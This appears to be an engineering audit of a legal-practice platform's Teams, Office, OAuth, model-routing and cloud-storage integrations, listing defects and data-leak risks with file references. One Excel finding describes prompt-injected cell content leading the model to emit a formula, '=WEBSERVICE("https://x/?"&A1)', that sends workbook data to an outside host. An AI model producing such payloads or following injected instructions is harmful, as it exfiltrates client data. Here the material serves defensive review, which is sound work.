title: Teams can very likely not embed either Teams tab
detail: The server-level headers X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' apply to every SPA route served by location / (nginx.conf:690-700; same again at 763-768 and 1037 for :443). There is no /teams exception, unlike /office/ (nginx/snippets/office_addin.conf:26).
user_impact: A firm that installs the Teams app probably sees a blank 'refused to connect' tab for both the personal tab and the configurable tab.

title: Teams tabs rely on the SPA cookie session with no Teams SSO
detail: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:346-353). An unauthenticated user is sent to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (backend/app/config.py:60), so the browser does not send them in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls authentication.getAuthToken and there is no token-exchange endpoint.
user_impact: Even after the framing fix, users inside Teams hit a login page that cannot finish in an iframe (Microsoft login refuses to be framed).

title: Excel set_selected_values bypasses the unsafe-formula ban
detail: Values are checked only for JSON scalar type (office_action_policy.py:53-57). The WEBSERVICE/HYPERLINK/external-reference regex (lines 31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel reads a value starting with '=' as a formula. validation.ts:99-102 does not check values either.
user_impact: Prompt-injected cell content can make the model return a value like '=WEBSERVICE("https://x/?"&A1)'. It is buried in a JSON preview and, once applied, can exfiltrate workbook data or add external links, defeating the stated guard.

title: Add-in cookie session probably fails in Office on the web and new Outlook
detail: The exchange sets HTTP-only cookies (backend/app/routers/auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60). The pane then re-reads /auth/me with credentials. The code's own comment (officeSession.ts:73-77) says the Lax cookie is not sent cross-site. On web hosts the pane is iframed under office.com / cloud.microsoft, so the cookie is dropped and the pane shows 'Office sign-in completed without a LawHand session'.
user_impact: The pilot works at best in classic desktop clients. Word/Excel on the web and new Outlook for Windows, which Microsoft is making the default, cannot sign in.

title: Add-in CSP frame-ancestors omits *.cloud.microsoft
detail: Allowed ancestors are *.office.com, *.office365.com, *.live.com and *.microsoft.com. Microsoft 365 web apps are moving to word/excel/outlook/m365.cloud.microsoft. frame-ancestors checks every ancestor, including the top-level page.
user_impact: The task pane can be blocked from loading in Office on the web or new Outlook served from cloud.microsoft domains.

title: The Outlook read-mode button is a dead end
detail: The manifest advertises 'Review Outlook messages' and activates on read items (outlook.xml:29-31, 41-53). main.ts:43-46 enables Propose without checking capabilities.writeEnabled. The server then rejects the plan with 'This Office host is read-only' (office_action_policy.py:72-73), after the full message body (up to 50k characters) has been uploaded.
user_impact: A user who opens LawHand on a received email, types 'summarize', gets an error, and has sent client email content to the server for nothing.

title: The committed Teams package is stale (old domain and old Entra app)
detail: manifest.json in teams-app/lawhand-teams.zip still points at legalapp.perevagagroup.com and webApplicationInfo id c805316c-..., while teams-app/manifest.json uses getlawhand.com and 062a7776-.... CI never rebuilds it. package.ps1 needs Windows (System.Drawing) and TASKS.md:146 is still open.
user_impact: An admin who uploads the checked-in zip installs an app that loads the wrong host.

title: The Teams channel-tab save reports success without creating a working tab
detail: setConfig is only called through window.microsoftTeams (line 69), which the ESM @microsoft/teams-js v2 import (line 2) does not create as a global. saveConfiguration catches its own errors (line 79), so registerOnSaveHandler always calls notifySuccess (line 90), even when createTeamsLink failed.
user_impact: Admins can save a channel tab that has no content URL or no matter link, with no error shown.

title: The personal tab shows 'No channels linked' to every non-admin
detail: GET /links goes through require_teams_enabled, which requires the admin role (routers/teams.py:155-157). TeamsTabPage.jsx:10-12 swallows the 403 and renders an empty list.
user_impact: Attorneys and staff wrongly conclude that no matter channels exist.

title: Unused high-privilege Teams Graph scopes are requested
detail: Chat.ReadWrite (read/write all of the user's chats) and TeamsActivity.Send are required for teams_connected, but nothing in backend/app references chats or sendActivityNotification. The admin guide discloses them (13-microsoft-teams-administration.md:18).
user_impact: Over-broad consent is a blocker in law-firm security reviews and exposes privileged chat content if a token leaks.

title: Add-in session expires after 30 minutes with no recovery
detail: authenticated is set once at startup. OfficeApi.request throws on any non-OK response (office-addin/src/api/officeApi.ts:21-28) and never calls /auth/refresh or re-runs session.ensure. ACCESS_TOKEN_EXPIRE_MINUTES=30 (backend/app/config.py:42).
user_impact: A pane left open in Word fails with 'Not authenticated' until the user closes and reopens it.

title: Word apply is untracked and flattens formatting
detail: insertText(..., replace) swaps the selection for plain text. Mixed formatting, fields, cross-references and footnote references inside the selection are lost. WordApi 1.4 is detected (line 21) but track changes is never turned on.
user_impact: An AI rewrite of a clause in a negotiated draft leaves no redline for opposing counsel or the supervising attorney.

title: Audit-failure status is wrong on reject and hidden on apply
detail: report() always says 'The Office change completed, but LawHand could not record its audit result' (line 101), including after a Reject where nothing changed (lines 154-165). On a successful apply, setStatus('Approved change applied.') at line 142 immediately overwrites the audit-failure message.
user_impact: Users are misled about whether the document changed, and compliance is never told that an applied AI change went unaudited.

title: Teams notification cards appear authored by a named admin
detail: The cards are posted with delegated ChannelMessage.Send (teams.py:401-406) using the consenting user's or tenant credential's token. There is no bot identity.
user_impact: Channel members see deadline alerts 'from' a partner and may reply to that person, expecting a human.

title: Word stale-check anchors on the selected text only
detail: The fingerprint is sha256 of the selected text, with no position or paragraph identity.
user_impact: If the user re-selects identical boilerplate elsewhere, the plan applies there without a stale warning.

title: Client limits are hardcoded; the policy endpoint and settings are ignored
detail: The Word/Excel limits are constants (excelAdapter.ts:13). /api/office/policy (routers/office_assistant.py:47-63) is never called. The schema caps Word text at 50,000 regardless of OFFICE_MAX_WORD_CHARACTERS (backend/app/schemas/office_assistant.py:46).
user_impact: If an admin changes the limits, users get unexplained 422 errors, or the new limit silently has no effect.

title: The Office exchange denies demo tenants that the plan endpoints allow
detail: The exchange calls require_office_pilot_tenant directly, while plans use require_office_for_user, which exempts billing_tier=='demo' (backend/app/services/office_access.py:42-48).
user_impact: Sales demos cannot sign in to the add-in unless the demo tenant is also allowlisted.

title: Missing Entra audience yields a bogus '/office.access' scope
detail: VITE_OFFICE_API_SCOPE is built as ${OFFICE_ENTRA_API_AUDIENCE:-}/office.access, so it is never empty. That bypasses the 'Office SSO is not configured' guard (office-addin/src/auth/officeSession.ts:40-42).
user_impact: A misconfigured deployment shows an opaque MSAL error instead of a clear configuration message.

title: Workspace MCP OAuth cannot serve confidential clients, so Copilot declarative agents and Gemini Enterprise cannot register
detail: AS metadata advertises token_endpoint_auth_methods_supported=['none']. DCR rejects any other method and never returns a client_secret (313-404, esp. 350-363). No operator or admin path creates a static client with a secret (WorkspaceMCPClient is only created in the DCR handlers). Microsoft 365 Copilot MCP plugins require DCR that issues a client_secret, and Gemini Enterprise custom MCP requires a client_id and client_secret. The ecosystem plan still lists 'OAuth 2.1 Workspace MCP with dynamic client registration' as existing leverage for the Microsoft agent (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63).
user_impact: A firm cannot add LawHand as an action in its Microsoft 365 Copilot agent or its Gemini Enterprise app today. ECO-09, ECO-12 and ECO-21 are blocked on auth before any product work.

title: OAuth client registrations hard-expire after 30 days regardless of use
detail: WORKSPACE_MCP_CLIENT_REGISTRATION_DAYS=30 (config.py:444) and is_active requires expires_at > now. The token endpoint calls _active_client before a refresh (router:704-705) and only updates last_used_at (router:806), never extending the expiry. Grants last 90 days (config.py:443).
user_impact: An actively used hosted connector (Copilot Studio, Claude.ai and so on) gets invalid_client on day 31. Every user must reconnect, or the host must re-register silently, and firms see an unexplained outage.

title: RFC 8707 `resource` is mandatory at authorize and at token/refresh
detail: `resource: str = Query(...)` (417) makes a missing resource a FastAPI 422 JSON error instead of an OAuth redirect error. The token endpoint returns invalid_target when resource is absent for every grant type, including refresh_token (706-708). MCP-spec clients send it; generic OAuth brokers (Teams Developer Portal token store, Power Platform connectors, Gemini Enterprise OAuth) may not.
user_impact: A non-MCP-native host can fail sign-in with an opaque error, or break at the first token refresh.

title: All-or-nothing consent: one scope the user's role lacks blocks the whole connection
detail: The consent request is refused (403) unless every requested scope is in _allowed_user_scopes (184-190, mapping 73-84). The protected-resource challenge asks for all known scopes (workspace_mcp_protocol.py:144-150). A hosted agent configured once by an admin therefore requests intakes:read and templates:propose for every user.
user_impact: Users without manage_intake or manage_documents (for example a paralegal role) cannot connect a firm-wide Copilot or Gemini agent at all. The error does not say which permission is missing.

title: Office planner sends Word selection / Outlook body to the Standard route with no data-class check
detail: create_plan always resolves use_premium=False and sends up to 50k characters of selection or email body (schemas/office_assistant.py:44-67) without calling route_matter_context_allowed. Standard is public-general by default (llm_routing.py:354-370). Chat enforces this gate (chat.py:2421-2430). Currently behind OFFICE_ASSISTANT_ENABLED plus the pilot list.
user_impact: In a pilot tenant, confidential document and email text can reach a low-cost Standard provider the firm never cleared for client data.

title: BYOK silently falls back to platform providers; reconfiguring without the key erases it
detail: If decrypt fails or no key is stored (bare except at 545-546), resolution continues to profile and platform routes. configure_customer_llm replaces customer_llm_config and keeps encrypted_api_key only when api_key is resent (admin.py:1557-1577), yet returns status ok with use_customer_llm=true. The plan requires 'no platform fallback unless the firm explicitly authorizes one' (docs/standard-premium-byok-billing-plan-2026-08-16.md:212-213).
user_impact: A firm that believes its prompts go only to its own Azure or Gemini account can have them processed and billed by LawHand's platform providers with no warning. That breaks the firm's data-residency promise.

title: BYOK Azure endpoint accepted without the /openai/v1 path and never tested
detail: The normalizer keeps whatever path the admin supplied, and LLMService points the plain OpenAI client at it (llm.py:272-275). The Azure portal's resource URL (https://x.openai.azure.com/) is accepted, but OpenAI-SDK chat calls need the /openai/v1/ base path (or deployment-scoped classic URLs). There is no connection test at save time (admin.py:1536-1571). The llm_availability probes only test gateway aliases (llm_availability.py:40-130).
user_impact: An admin can save a 'working' BYOK configuration where every AI call then fails with a gateway error.

title: BYOK Gemini uses an AI Studio key with no paid-tier, region or Vertex controls
detail: The only Gemini option is the fixed global generativelanguage.googleapis.com endpoint with an API key. Nothing checks that the key belongs to a paid Cloud-Billing project, where Google does not use content to improve products. There is no regional or Vertex AI option. The default model is hardcoded to gemini-2.0-flash (llm_routing.py:555).
user_impact: A firm could connect a free-tier key and expose client content to provider training or review. Firms needing EU or US residency cannot use their own Gemini.

title: Office plan usage recorded at $0 because costing matches the gateway alias name
detail: _usage_record prices route.model, which is a LiteLLM alias such as 'lawhand-standard' (config.py:267). calculate_cost only matches substrings like claude/gemini/deepseek and otherwise logs a warning and returns 0 (billing.py:60-66). Chat avoids this by using the provider-reported model (chat.py:2916).
user_impact: AI spend from the Office planner is invisible in tenant usage and billing, which undercounts cost and margin.

title: Consent screen trusts a self-asserted client_name; admins cannot allowlist assistant clients
detail: Any DCR client chooses its own client_name (365-372). The consent API returns only id and name, with no redirect host, publisher or verification status, and the page renders that name (WorkspaceMcpAuthorizePage.jsx:70). There is no tenant-level allowlist of approved clients. The only controls are tenant and user on/off (workspace_mcp_access.py:31-43). The channel contract says 'The firm decides which external accounts and vendors it permits' (docs/byo-harness-channel-contract.md:78-83).
user_impact: A malicious registration named 'Microsoft 365 Copilot' can phish consent to firm data. A firm cannot restrict connections to its sanctioned Copilot or Gemini tenant.

title: propose_workflow_run / resume_workflow_run schemas use nested $ref models, which Copilot Studio filters out
detail: WorkflowRunInput nests RunStepInput and SourceBinding lists. The tool schema is emitted directly from model_json_schema() (workspace_mcp_protocol.py:230-236), which produces $defs/$ref. Copilot Studio documents that tools with reference-type inputs are dropped. Many optional fields also emit anyOf-null unions, which are untested on Microsoft and Google hosts.
user_impact: Multi-step workflow tools may silently not appear in a Copilot Studio agent.

title: Tool results carry relative links and internal file-server paths
detail: search_firm_memory returns unc_path, share_id and owner, and returns lawhand_url as a relative '/firm-memory?...' path. Source chips use a relative '/api/documents/{id}/download' (396). The adapter doc says raw storage identifiers are not exposed to models (docs/workspace_mcp_adapter.md:395).
user_impact: Copilot and Gemini cannot render usable deep links. Internal SMB topology and owner names leave the firm inside a third-party assistant's history.

title: Consent label understates communications:propose (email only, but it also authorizes SMS drafts)
detail: The label reads 'Draft client email proposals without sending', but propose_client_sms requires the same scope (automation_capabilities.py:532-547).
user_impact: Users consent to SMS drafting without being told.

title: Broker checks the data class before resolving the route, so the BYOK fail-closed rule is skipped
detail: _enforce_policy calls route_matter_context_allowed without a route (259-268), then resolve_llm_route (317-321) may return the 'customer' BYOK route. llm_routing.py:383-402 says BYOK must fail closed for confidential data. Affects prospect-confidential after-call preparation (after_call_preparation.py:204-219), which is behind a flag.
user_impact: Policy differs between chat (blocked) and background preparation (allowed) for the same BYOK tenant. That makes privilege and data-flow promises hard to state.

title: 'copilot' BYOK naming and dead Azure/Gemini settings contradict product policy
detail: Code comments and the API describe 'use their own Gemini/Copilot subscription' (admin.py:1509,1521), but the provider is Azure OpenAI. The plan states a Copilot end-user subscription is never LawHand inference capacity (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:55-57). AZURE_OPENAI_* and GEMINI_API_KEY are unused (config.py:156-161).
user_impact: Sales, support or admins may believe LawHand already uses the client's Microsoft 365 Copilot license. It does not.

title: Formatted template/agent DOCX drafts are editable as plain text; saving flattens firm formatting and can truncate content
detail: propose_document_from_template and propose_matter_document_file build MatterDocumentDraftAction without document_edit_mode. It therefore defaults to 'lawhand_text' (backend/app/schemas/chat_action.py:439); only the cloud-sync path sets 'office_snapshot' (backend/app/routers/tasks.py:2109). A text save (tasks.py:1806-1835) creates a revision from the extracted preview text and re-renders it with render_revision_docx (cloud_artifact_materialization.py:260-270, 435-440): python-docx default styles plus a heading. This contradicts the documented intent that such snapshots stay read-only 'so a save cannot flatten the original formatting' (docs/workspace_mcp_adapter.md:489-491). The preview is capped at 50k chars, so a truncated preview saved this way drops the rest of the document. Behind WORKSPACE_MCP_ENABLED and workflow runs.
user_impact: A reviewer fixes a typo in the LawHand workspace. The engagement letter loses its letterhead, tables, headers and footers, and long agreements lose every clause past about 50k characters. Approval then binds to the damaged DOCX.

title: Editing a normal matter document in Word Online/Drive breaks LawHand access with no reconcile path
detail: Download reads cloud bytes with expected_size=doc.file_size, and read_matter_file_bytes enforces the stored size (matter_file_store.py:233-242, 1543-1551). Any edit made through the 'Open in OneDrive/Google Drive' link (MatterDocumentsTab.jsx:1139-1147, 1278-1287) raises an integrity error. The document is marked storage_state='conflict' and every later download returns 409. E-sign creation reads with the same size check (backend/app/routers/esignature.py:449-456). Folder sync never updates MatterDocument size or hash. Only task-bound AI drafts have an adopt endpoint (tasks.py:1906). The upload toast even says 'Edits happen in the firm's cloud copy' (MatterDocumentsTab.jsx:440-444).
user_impact: An attorney edits a generated DOCX in Word for the web, as the UI suggests. LawHand can no longer download it, send it for signature or feed it to AI. The document is stuck with a vague 409 and nothing in the UI resolves it.

title: MCP/workflow template render ignores Studio conditional and repeating regions
detail: render_workspace_template calls fill_docx_template without collections= or regions=. The in-app render passes collections=_repeat_collections(parties) and regions=stored_regions(schema) (backend/app/routers/document_templates.py:4687-4698). Regions authored in Studio are stored as paragraph ranges that exist only in the field map (backend/app/services/template_regions.py:1-12), so they are never applied on this path.
user_impact: A draft produced by an external assistant or a workflow includes every 'if/unless' clause regardless of the matter facts and does not expand per-party sections. The same template gives different legal text depending on where it was rendered.

title: LawHand text save silently orphans Word Online edits on an AI draft
detail: When superseding, materialize() only marks the previous document 'superseded'. It never reads the previous cloud object's current hash or eTag. The workspace shows 'Open cloud working copy' next to the editable textarea and 'Save as new cloud revision' (DocumentDraftWorkspace.jsx:172-175), and TaskBoard assumes storage is 'verified' on the client side (TaskBoard.jsx:1064).
user_impact: A reviewer edits in Word for the web and then tweaks text in LawHand. The Word edits stay in a superseded -r1.docx and are missing from the reviewed and approved revision, with no warning.

title: Microsoft Auto mode writes matter files to the connecting admin's personal OneDrive
detail: Auto mode binds Microsoft tenants to 'onedrive' (matter_file_store.py:199-204). The upload uses the tenant-level token (line 832) against /me/drive/items/{parent}. No sharing or permission grants to other firm users were found on the OneDrive path.
user_impact: 'Open cloud copy' or Word co-authoring fails with access denied for every staff member except the admin who connected Microsoft 365. The firm's documents also depend on one person's mailbox licence.

title: AI drafts require an explicit primary_cloud_provider while uploads and templates auto-bind
detail: _configured_provider raises CloudNotConfiguredError when the setting is blank. MatterFileStore._resolve_provider_policy falls back to the active Microsoft or Google connection (matter_file_store.py:159-204).
user_impact: A firm in Auto mode can save template documents to OneDrive, but chat or MCP drafting fails with 'Choose and connect a primary tenant cloud provider'.

title: SharePoint-bound matters look unprovisioned and cloud docs are labelled 'Local'
detail: The folder header treats a matter as provisioned only if providers.onedrive or providers.google_drive exists; SharePoint is stored under 'sharepoint'. storageLabel() has no 'sharepoint' case and returns 'Local' (MatterDocumentsTab.jsx:68-73), so rows show 'Open in Local'.
user_impact: SharePoint firms see 'Document folders are not set up' and a 'Set up folders' prompt on every matter, and cloud documents are misreported as local, which undermines trust in where files live.

title: Native Google Docs are invisible to LawHand
detail: Matter-folder sync (cloud_sync.py:335-340) and firm-knowledge sync (document_sync.py:22-28, 281-305) filter to PDF/DOCX/DOC/RTF/TXT MIME types. application/vnd.google-apps.document is excluded, and the download uses alt=media (document_sync.py:370), which cannot fetch Docs; there is no files.export.
user_impact: Google Workspace firms that draft in Google Docs never see those documents in the matter, in search or in AI context.

title: PDF-for-signature fidelity: container lacks metric-compatible Office fonts
detail: Only fonts-liberation and fonts-nanum are installed. There is no Carlito/Caladea (Calibri/Cambria metrics) and nothing for Aptos. The team's own validation says it does 'not certify production LibreOffice conversion' (docs/template-studio-word-source-review.md:62).
user_impact: The signed PDF's line and page breaks differ from the Word original. Signature captions can move pages, and attorneys see a different document from the one they authored.

title: Live DOCX->PDF preview spawns an unbounded number of LibreOffice processes in the API worker
detail: The render-file preview calls docx_to_pdf_bytes directly for each request, with no semaphore or queue; only the source-preview cache is single-flight (template_source_preview.py:35-37). Auto-preview re-fires 650 ms after typing stops (frontend/src/components/prepare/usePrepareFill.js:13, 79, 425-428). Each conversion is a fresh soffice start with up to 60 s timeout (docx_to_pdf.py:92-116).
user_impact: Several paralegals filling Word templates at once can exhaust API CPU and memory, slowing or failing unrelated requests and producing preview timeouts.

title: Filled sample documents used as template sources are kept on LawHand's host disk, not tenant cloud
detail: Intake invites 'the document your team already reuses... Filled or handwritten entries help locate reusable details' (TemplatesPage.jsx:843). These originals are persisted under UPLOAD_DIR, while matter files are routed to 'the customer's own cloud storage, not ours' (matter_file_store.py:1-8).
user_impact: Client PII in a filled sample stays on LawHand infrastructure, outside the firm's M365/Workspace retention and eDiscovery controls.

title: Shared platform service account can expose other tenants' Shared Drive files in tenant-wide search and sync
detail: The same service account (GOOGLE_SERVICE_ACCOUNT_KEY) is added as fileOrganizer to every Workspace tenant's auto-created Shared Drive (cloud_init.py:1214-1244). When a user has no own Google grant, or no user_id is passed (admin test search cloud_admin.py:465, tenant sync_all), _get_google_token and cloud_sync._get_token (cloud_sync.py:833-864) return that service-account token. _search_google_drive then queries with corpora=allDrives and no driveId when there is no matter folder (cloud_search.py:666-676). That covers every Shared Drive the service account belongs to, across all tenants. Content is then downloaded by fetch_contents (1098-1138), and there is no post-filter on drive_id (cloud_search.py:333-347). The prefer_service_account probe (google_service_account.py:213-258) only confirms access to this tenant's drive; it does not scope queries to it.
user_impact: A general chat or plugin question at firm A can bring firm B's privileged document titles and text into firm A's AI answer and cloud index. This is a confidentiality breach across tenants.

title: Connecting admin's personal Gmail and Drive are searchable by every firm user through tenant-credential fallback
detail: _connected_providers treats the tenant credential as 'connected' for every user. cloud_search._get_google_token falls back to get_fresh_token (the admin's delegated grant) when the user has no own token (cloud_search.py:1516-1527). Gmail search (751-850) and full-body fetch (1140-1167) are not matter-scoped. sync_all also indexes the admin's last 7 days of mail tenant-wide (cloud_sync.py:128-134, 455-568). The Hub copy asks admins to 'Confirm the ... mailbox boundary' (IntegrationsHub.jsx:100), but no such control exists.
user_impact: Any associate or staff chat can surface the managing partner's private or other-client email bodies and Drive files. This breaks ethical walls, and it conflicts with the Limited Use statement that data is used only for the requesting user's features.

title: All firm tasks are pushed into the connecting admin's Google Calendar
detail: _get_token returns the tenant (admin) token whenever the assignee has no per-user Google token (exact_user is False). push_task_to_calendars fires upsert_task_event for every task with a due date (task_notifications.py:270-316). Event titles include the matter name. The Microsoft path has the same pattern (microsoft_calendar.py:23-43).
user_impact: The admin's personal calendar fills with every staff member's deadlines and matter names, which may also be visible to anyone the calendar is shared with. Assignees don't get the events at all.

title: Gmail sync and search silently return nothing for tenants using the org Shared Drive
detail: _get_token applies prefer_service_account for every Google call, not just Drive. For org_shared_drive tenants, the Gmail list call runs with a Drive-only service-account token and no domain-wide delegation subject, which Gmail rejects. sync_gmail_metadata then returns 0 without raising an error (cloud_sync.py:494-501). The sync run therefore looks successful with 0 items. The same token swap affects Gmail search through _get_google_token.
user_impact: Workspace firms on the default Shared Drive path never get Gmail indexed or searched, and the UI shows no error.

title: Re-authorize for Personal Google tenants always fails
detail: handleReauthorize calls /integrations/google/connect?intent=admin without account_mode, so the backend defaults to 'workspace' (integrations.py:659-661). The callback detects a personal account and returns account_mode_mismatch (integrations.py:798-800). _error_redirect always sends admin errors to /onboarding (integrations.py:1790-1807).
user_impact: A solo or personal-Gmail firm whose token was revoked or expired cannot repair it from Admin > Integrations, and gets bounced into the onboarding wizard with a confusing error.

title: Requested scopes exceed what the code uses; 'Connect Calendar' asks for Gmail read/send and full Drive
detail: All modes request gmail.readonly and full drive (both restricted, requiring annual CASA) plus full calendar. The code only touches calendars/primary/events, so calendar.events is enough. Drive work is almost entirely on app-created folders and files, so drive.file is enough; full drive is needed only for drives.create and for whole-Drive search/sync. drive.readonly does not help because it is also restricted and writes are required. gmail.metadata does not help because it is restricted and cannot run the q search, the raw/full reads or capture. The per-user grant (integrations.py:260-265) is launched from a button labelled 'Connect Calendar' (api.js:2305-2307). The hotfix review says Personal mode uses 'least-privilege' scopes (docs/onboarding-hotfix-review-2026-09-16.md:17), but GOOGLE_SOLO_SCOPES only drops directory.
user_impact: Users abandon consent at the unverified-app screen with restricted scopes. Verification and CASA are blocked or costly. Every attorney hands over their full Drive and mailbox just to get calendar sync.

title: Granular consent is detected but features don't degrade per capability
detail: If a user unticks Gmail or Drive on Google's granular consent screen, the scope gap is stored (integration_observability.py:42-56). resolve() still marks email, calendar and cloud_storage 'ok' regardless of scopes (169-171). Per-user rows with health missing_scopes are counted as needs_reauth indefinitely (integration_observability.py:81). Feature calls fail with 403 and only log a warning, returning [] (e.g. cloud_search.py:678-687). No include_granted_scopes and no per-feature scope request exist to recover incrementally.
user_impact: The admin UI says email and storage are 'Available' while they silently fail. Users who deliberately declined Gmail are told forever that they must reconnect.

title: Deleting a matter document stored in a Shared Drive can orphan the file; deletes skip the Drive trash
detail: _delete_cloud_provider_object issues DELETE files/{id} without supportsAllDrives=true, unlike the staged-cleanup path (matter_file_store.py:431-435). For a Shared Drive item, Drive answers 404. ProviderNotFound is treated as success and the database record is removed (matter_documents.py:347-348). For My Drive items, files.delete is permanent and bypasses trash, whereas the Graph DELETE moves items to the recycle bin. Plausible; confirm the 404 behavior against a live Shared Drive.
user_impact: The firm thinks a document was deleted while it stays in the Shared Drive (a retention and privilege issue). Separately, an accidental delete on My Drive cannot be recovered.

title: No Google disconnect in the UI, no per-user disconnect, and synced data is not purged
detail: The legal notice promises an administrator can disconnect Google from integration settings (LegalNoticePage.jsx:58). ProviderCard shows only Connect/Re-authorize (IntegrationsPanel.jsx:760-768), and api.js has no Google or Microsoft disconnect helper. Users cannot remove their own Google grant; Zoom has a per-user disconnect (integrations.py:2370-2391). Disconnect leaves Gmail subjects, snippets and participants in cloud_metadata_index.
user_impact: This conflicts with the Google Limited Use and deletion commitments needed for verification. Staff who connected their mailbox have no in-app way to revoke it.

title: Per-user Google grant has no identity check
detail: The user flow requests no openid or email scope, so no id_token or hd is available (the comment at 779-783 says this is deliberate). There is no check that the connected Gmail matches the LawHand user or the firm domain. connected_mail then sends approved client correspondence from whichever account was connected (connected_mail.py:350-379).
user_impact: An attorney can connect a personal @gmail.com, and privileged client email goes out from, and is stored in, a non-firm account.

title: Google scheduled events send no invitations and cannot include a Meet link
detail: events.insert with attendees but no sendUpdates parameter defaults to 'none', so no invites are sent. There is no conferenceData or hangoutsMeet option; meeting_provider allows only none, teams or zoom (schemas/calendar.py:101-106). The Microsoft branch creates Teams meetings and Graph sends invites (scheduled_events.py:66-92).
user_impact: Clients and opposing counsel added as attendees on a Google-calendar firm never receive the meeting, and Google firms must pay for Zoom to get video links.

title: Directory sync never deactivates suspended or removed Google users
detail: Suspended accounts are skipped rather than setting is_active=False on an existing LawHand user. Users deleted from Workspace are never reconciled. Every other account is created as license_active=True (346). The Microsoft sync has the same pattern (user_sync.py:154-156).
user_impact: Departed staff keep LawHand access and consume paid seats until someone deactivates them manually.

title: Google Drive import query is wrong: requires both MIME and extension, skips Shared Drives, no paging
detail: It uses " and ".join(mime, ext) where cloud_sync uses OR (cloud_sync.py:339). There is no supportsAllDrives or includeItemsFromAllDrives, and pageSize is min(max_files,100) with no nextPageToken.
user_impact: The .odt/.wpd files it claims to support, files without an extension, and anything in a Shared Drive are never imported. The file-count stats top out at 100.

title: Plugin integration detection checks a Drive scope LawHand never requests
detail: google_drive is detected only if drive.readonly is granted, but LawHand requests the full drive scope. OneDrive has the same problem (Files.Read.All versus the requested Files.ReadWrite.All).
user_impact: The Plugins page never lists Google Drive (or OneDrive) as connected, even when it is working.

title: Domain-wide delegation is configuration only, and the comments are misleading
detail: The docstring says domain-wide delegation is used for directory and mail, but no caller passes subject and GOOGLE_IMPERSONATE_SUBJECT (config.py:175-178) is never read. DRIVE_SCOPES is described as 'least privilege' but is the full drive scope.
user_impact: Operators may set up delegation expecting it to work. Reviewers may believe the scopes were already minimized.

title: /api/integrations/status reports Personal Google tenants as missing a scope
detail: google_required is always GOOGLE_ADMIN_SCOPES, with no effective_required_scopes for the personal tier, so missing_scopes includes admin.directory and reconnect_required is true (1904-1921). The /admin/permissions endpoint handles this correctly (admin.py:1702).
user_impact: Consumers of this endpoint (Teams pages today, and any future agent or status UI) misreport healthy personal tenants.

title: Admin M365 connect never requests openid, so tier is 'unknown' forever, directory sync is blocked and service_account_email is never set
detail: MICROSOFT_ADMIN_SCOPES (integrations.py:241-244) lacks openid/profile, so Microsoft returns no id_token. claims stays None, detect_microsoft(None) returns ('unknown', None), and apply_detection still stamps account_detected_at (account_detect.py:184-189). backfill_unknown_credentials then skips the row forever (account_detect.py:140-141). cap._directory_sync returns unavailable for an unknown tier (capabilities.py:98-103), and user_sync._directory_sync_blocked turns every Microsoft sync into not_applicable (user_sync.py:122-124). send_admin_notification needs service_account_email (email_admin.py:106) and so never uses Graph. No test covers the MS admin callback token response.
user_impact: Microsoft 365 firms can never import users from Entra. The admin card shows 'Microsoft (tier unknown)' with 'reconnect to confirm directory access', and reconnecting cannot fix it. 'Granted by' is blank, and Teams voice cannot be pre-filled with the tid.

title: Connecting admin's personal mailbox is indexed every 15 minutes into firm-wide search and served to any user
detail: sync_all calls sync_outlook_mail(db, tenant_id) with no user_id (cloud_sync.py:153-160). _get_token therefore uses the tenant (admin) delegated token, so /me/messages is the admin's mailbox. The 200 newest subjects, participants and 500-character bodyPreview are upserted into cloud_metadata_index. search_index filters only on tenant_id and provider/object_type (cloud_search.py:471-481); there is no owner ACL. RAG calls it for every user (rag.py:1889-1905), and the scheduler runs it on an interval (scheduler.py:804-810).
user_impact: Associates, staff or walled-off users can surface partner/HR/privileged email subjects and snippets through the AI assistant. This is a confidentiality and ethical-wall breach inside the firm.

title: Users without a personal Microsoft connection silently search and read the admin's mailbox and files through token fallback
detail: _get_microsoft_token falls back to get_fresh_token (the admin's delegated grant). Graph /search/query for the message entity then searches the admin's mailbox (cloud_search.py:941-986), and _fetch_outlook_content downloads full MIME from /me/messages/{id}/$value (1329-1362). driveItem search returns anything the admin can access. Even matter-scoped searches keep 'outlook' in the global query (_microsoft_sources_without_scoped, 1745-1764).
user_impact: Any firm user's chat question can return the full text of the admin's emails and the admin's private OneDrive/SharePoint files, bypassing Microsoft's permission model.

title: Firm matter documents default to one admin's personal OneDrive, and access dies with that account
detail: Every admin connect auto-creates the LawHand root in the connecting admin's /me/drive via _ensure_cloud_root (integrations.py:2398-2438). Auto mode picks OneDrive when Microsoft is active (integrations.py:1996-2002). All reads and writes use the admin's delegated token (matter_file_store.py:42-56, 866-871). storage_root_ownership classifies this as at_risk, but that is shown only in onboarding. App-only Sites.Selected is planned only (docs/storage-root-ownership-and-handoff.md:85-110).
user_impact: When the admin leaves, is disabled, resets MFA, or hits a Conditional Access change, every matter upload, open and sync fails. After Entra deletes the account, OneDrive retention can destroy the firm's matter files.

title: Removing a matter assignee never revokes the OneDrive/SharePoint/Drive folder share granted to them
detail: Assignees are invited with write roles via /me/drive/items/{id}/invite (cloud_init.py:617-697, called from matters.py:185-218 and 3095/3188/3263/3402). remove_assignment deletes the row and cleans calendars but never calls DELETE .../permissions/{id}. The codebase has no unshare function.
user_impact: A lawyer screened off a matter (conflict or ethical wall) keeps write access to its cloud folder indefinitely, which is a professional-responsibility exposure.

title: Per-user Microsoft tokens break OneDrive matter-folder search, sync and fetch (items live in the admin's drive)
detail: When a user has a personal token it is preferred, and folder search, sync and content fetch then call /me/drive/items/{adminFolderId}/... (cloud_search.py:1412, 1182-1184; cloud_sync.py:596-620). For an item in another user's drive Graph returns itemNotFound. _sync_graph_files logs and breaks (cloud_sync.py:1058-1064). The matter 'Sync folder' route passes user_id (matters.py:3407-3413) and reports status 'synced' with 0 files.
user_impact: Attorneys who follow the 'Connect Calendar' prompt see empty matter cloud files and get AI answers without the matter documents. Users who never connected get results (via the admin token).

title: Firm task deadlines are pushed to the admin's Outlook calendar when the assignee has no personal token
